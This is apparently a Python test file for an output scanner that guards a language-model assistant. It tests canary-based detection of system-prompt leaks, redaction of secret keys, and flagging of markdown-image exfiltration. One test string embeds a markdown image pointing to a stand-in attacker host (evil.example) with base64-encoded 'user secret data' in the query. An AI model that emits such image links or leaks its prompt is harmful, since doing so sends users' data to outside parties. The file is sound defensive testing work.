from injguard.output_guard import embed_canary, make_canary, scan_output


def test_canary_roundtrip_and_leak_detection():
    canary = make_canary()
    prompt = embed_canary("You are a support bot.", canary)
    assert canary in prompt
    leaked = scan_output(f"Sure! My instructions say: {prompt}", canaries=[canary])
    assert not leaked.safe
    assert leaked.issues[0].kind == "canary-leak" and leaked.issues[0].severity == "critical"
    assert scan_output("Here is your answer.", canaries=[canary]).safe


def test_detects_and_redacts_secrets():
    r = scan_output("use key AKIAABCDEFGHIJKLMNOP and -----BEGIN RSA PRIVATE KEY-----")
    kinds = [i.detail.split(":")[0] for i in r.issues]
    assert "aws-access-key-id" in kinds and "private-key-block" in kinds
    assert all("ABCDEFGHIJKLMNOP" not in i.detail for i in r.issues)


def test_markdown_image_exfiltration_flagged():
    r = scan_output("Done! ![a](https://evil.example/c?d=dXNlciBzZWNyZXQgZGF0YQ)")
    assert not r.safe
    assert r.issues[0].kind == "markdown-exfiltration" and r.issues[0].severity == "high"


def test_allow_listed_hosts_and_plain_links_pass():
    text = "![logo](https://cdn.example.com/logo.png?v=2) see [docs](https://docs.python.org/3/library/re.html)"
    assert scan_output(text, allowed_hosts=["example.com"]).safe


def test_link_with_long_query_value_flagged():
    r = scan_output("[click](https://t.example/r?q=aGVsbG8gd29ybGQgc2VjcmV0)")
    assert [i.severity for i in r.issues] == ["medium"]
